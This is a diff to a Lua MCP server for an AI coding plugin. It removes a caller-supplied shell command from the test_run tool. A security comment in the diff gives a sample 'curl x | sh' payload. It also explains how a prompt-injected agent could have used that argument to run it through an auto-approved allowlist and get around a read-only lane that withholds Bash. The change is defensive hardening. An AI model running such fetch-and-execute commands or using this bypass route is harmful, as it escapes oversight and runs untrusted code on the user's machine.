@@ -4,7 +4,8 @@
 -- JSON-RPC 2.0; Content-Length framed messages are NOT used here — Claude
 -- accepts the simpler newline-delimited form for stdio servers.
 --
--- Exposed tools (all read-only):
+-- Exposed tools (read-only except where noted; test_run runs the project's
+-- own fixed test command and verify_file may write a verification artifact):
 --   Project bookkeeping:
 --     nvime.search_attribution(file, line)   — agent-attribution entries for a line
 --     nvime.list_plans()                     — list .nvime/plans/<id>/ entries
@@ -17,7 +18,7 @@
 --     nvime.git_log(path?, limit?)           — recent commits, optionally scoped to a path
 --     nvime.git_blame(path, line)            — blame metadata for a specific line
 --   Verification + memory:
---     nvime.test_run(runner?, timeout?)      — run the configured/auto-detected test runner
+--     nvime.test_run(timeout?)               — run the project's OWN configured/auto-detected test runner
 --     nvime.verify_file(file, content?,      — pre-accept verify lane (parse+lint+type)
 --                       wait_ms?)               match the protocol VERIFY: line to status
 --     nvime.session_search(query, limit?)    — full-text search across past chat transcripts
@@ -145,14 +146,10 @@ local TOOLS = {
   },
   {
     name = "nvime.test_run",
-    description = "Run the project's test runner and return the tail of stdout+stderr plus exit code. The runner is `runner` if supplied, else state.config.test_loop.runner / state.config.plan.test_runner, else auto-detected from project markers (Cargo.toml, package.json, scripts/test, etc.). Bounded by `timeout` ms (default 60000, max 300000).",
+    description = "Run the project's OWN test runner (state.config.test_loop.runner / state.config.plan.test_runner, else auto-detected from project markers like Cargo.toml, package.json, scripts/test) and return the tail of stdout+stderr plus exit code. The command is fixed by project config and cannot be supplied by the caller. Bounded by `timeout` ms (default 60000, max 300000).",
     inputSchema = {
       type = "object",
       properties = {
-        runner = {
-          type = "string",
-          description = "Optional explicit shell command to run instead of the configured/detected one.",
-        },
         timeout = { type = "integer", description = "Wall-clock cap in milliseconds (default 60000, max 300000)." },
       },
     },
@@ -679,7 +676,12 @@ local function bounded_collector(cap)
 end
 
 local function tool_test_run(args)
-  local runner = (args.runner and args.runner ~= "" and args.runner) or configured_runner() or detected_runner()
+  -- SECURITY: the runner is NEVER taken from the caller. A prompt-injected
+  -- review/plan agent could otherwise pass `runner = "curl x | sh"` and get it
+  -- executed via `sh -c` (auto-approved through the mcp__nvime allowlist),
+  -- bypassing the read-only lane's withheld Bash. Only the project's own
+  -- configured/detected runner runs.
+  local runner = configured_runner() or detected_runner()
   if not runner then
     return err_result("no test runner configured or detected for this project")
   end
